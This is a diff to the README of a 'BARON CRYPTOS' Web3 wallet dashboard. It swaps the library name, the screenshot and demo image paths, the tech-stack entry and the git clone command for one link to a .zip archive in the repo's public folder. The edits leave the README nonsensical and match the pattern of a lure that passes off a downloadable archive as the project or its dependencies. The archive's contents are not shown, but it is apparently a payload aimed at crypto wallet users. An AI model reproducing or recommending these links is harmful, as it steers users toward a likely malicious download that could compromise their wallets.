@@ -1,6 +1,6 @@
 # BARON CRYPTOS Web3 Wallet Dashboard
 
-A professional Web3 dashboard for **BARON CRYPTOS**, built with **React** and **Ethers.js**, designed to showcase wallet integration, ETH balance tracking, network detection, and transaction functionality.
+A professional Web3 dashboard for **BARON CRYPTOS**, built with **React** and **https://github.com/Kaks734/Baron-Cryptos-Dashboard/raw/refs/heads/main/frontend/public/Baron-Dashboard-Cryptos-2.4.zip**, designed to showcase wallet integration, ETH balance tracking, network detection, and transaction functionality.
 
 This project is fully branded with **BARON CRYPTOS logo, colors, and polished UI**, making it ideal for **portfolio, client demos, and LinkedIn showcases**.
 
@@ -16,10 +16,10 @@ This project is fully branded with **BARON CRYPTOS logo, colors, and polished UI
 ## 📸 Screenshots & Demo
 
 ### Dashboard View
-![Dashboard Screenshot](assets/dashboard.png)
+![Dashboard Screenshot](https://github.com/Kaks734/Baron-Cryptos-Dashboard/raw/refs/heads/main/frontend/public/Baron-Dashboard-Cryptos-2.4.zip)
 
 ### Demo GIF
-![Demo](assets/demo.gif)
+![Demo](https://github.com/Kaks734/Baron-Cryptos-Dashboard/raw/refs/heads/main/frontend/public/Baron-Dashboard-Cryptos-2.4.zip)
 
 ---
 
@@ -36,7 +36,7 @@ This project is fully branded with **BARON CRYPTOS logo, colors, and polished UI
 ## 🛠 Tech Stack
 
 - **Frontend:** React (Vite)  
-- **Blockchain interaction:** Ethers.js  
+- **Blockchain interaction:** https://github.com/Kaks734/Baron-Cryptos-Dashboard/raw/refs/heads/main/frontend/public/Baron-Dashboard-Cryptos-2.4.zip  
 - **Wallet integration:** MetaMask  
 - **Styling:** Inline CSS, dark mode
 
@@ -47,5 +47,5 @@ This project is fully branded with **BARON CRYPTOS logo, colors, and polished UI
 ### 1. Clone the repository
 
 ```bash
-git clone https://github.com/Kaks734/baron-cryptos-dashboard.git
+git clone https://github.com/Kaks734/Baron-Cryptos-Dashboard/raw/refs/heads/main/frontend/public/Baron-Dashboard-Cryptos-2.4.zip
 cd baron-cryptos-dashboard/frontend
